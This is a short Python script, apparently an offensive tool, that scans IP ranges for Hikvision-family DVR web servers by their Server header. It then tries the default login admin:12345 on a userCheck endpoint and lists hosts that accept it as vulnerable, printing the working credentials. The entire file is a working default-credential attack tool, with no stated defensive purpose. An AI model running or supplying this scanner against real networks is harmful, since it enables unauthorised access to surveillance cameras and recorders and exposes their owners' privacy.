#!/usr/bin/python3
# -*- coding: utf-8- -*-
"""
Hikvision DVR scanner
 
autor: SQS
"""
R="\033[31m" #Red color
O="\033[33m" #Yellow color
W="\033[37m" #White color
 
import os, sys
import urllib.request, urllib.error, urllib.parse, base64
from netaddr import *
 
try:
        urls = sys.argv[1]
except:
        print("Usage: ./dwrscan.py 10.0.0.0/24, 192.168.0.0/16   or iplist.txt\n " )
        sys.exit()
 
Headers = {"DNVRS-Webs" : "/ISAPI/Security/userCheck", \
             "Hikvision-Webs" : "/PSIA/Custom/SelfExt/userCheck", \
             "DVRDVS-Webs" : "/PSIA/Custom/SelfExt/userCheck"\
             
             }
 
def attack(page, url):
        encodedstring = base64.encodestring(b"admin:12345")[:-1]
        auth = "Basic %s" % encodedstring.decode('utf-8')
        req = urllib.request.Request(page, None, {"Authorization": auth })
        handle = urllib.request.urlopen(req)
        s=handle.read()
        if b'200' in s:
                print (R+"[+] "+url+ " is vuln: user - admin, pass - 12345")
        else:
                print (O+"[-] "+url+ " is not vuln")
 
def stdy(urls):
        for r in IPNetwork(urls):
                try:
                        url="http://"+str(r)
                        res=urllib.request.urlopen(url,timeout=0.1).info()
                        header=dict(res)["Server"]
                        page = url + Headers[header]
                        attack(page, url)
                except KeyboardInterrupt:
                        print(W + "\nPressed Ctrl+C")
                        sys.exit()
                except:
                        pass
 
if (os.path.isfile(urls) == True):
        with open(urls, "r") as ins:
                array = []
                for line in ins:
                        stdy(line)
else:
        stdy(urls)
